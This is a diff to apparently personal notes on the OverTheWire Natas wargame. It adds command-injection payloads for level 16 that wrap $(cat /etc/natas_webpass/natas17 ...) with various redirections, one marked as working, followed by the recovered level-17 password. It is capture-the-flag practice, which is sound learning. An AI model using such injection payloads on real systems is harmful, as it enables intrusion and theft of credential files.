@@ -76,3 +76,29 @@ blind based sql injection
 WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
 
 http://natas16.natas.labs.overthewire.org/
+
+grep -i "$(cat pass/dict.txt 1>&2)" dict.txt
+grep -i "$(cat /etc/natas_webpass/natas17>/dev/stdin)" dict.txt
+
+$(cat /etc/natas_webpass/natas17>/dev/stdout) doesnt work on server!
+$(cat /etc/natas_webpass/natas17>/dev/pts/0) doesnt work on server!
+$(cat /etc/natas_webpass/natas17>php://stdin)
+
+https://developer.mozilla.org/en-US/docs/Learn/Forms/Sending_and_retrieving_form_data
+
+$(/etc/natas_webpass/natas17)
+
+$(touch upload/pass.txt)
+$(cat /etc/natas_webpass/natas17 > pass.txt)
+
+$(cat /etc/natas_webpass/natas17 2>$1)
+$(cat </etc/natas_webpass/natas17)
+
+$(echo hello > /proc/$(echo $$)/fd/0)
+$(cat /etc/natas_webpass/natas17 > /proc/$(echo $$)/fd/1) ***
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+http://natas17.natas.labs.overthewire.org/
+natas17
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
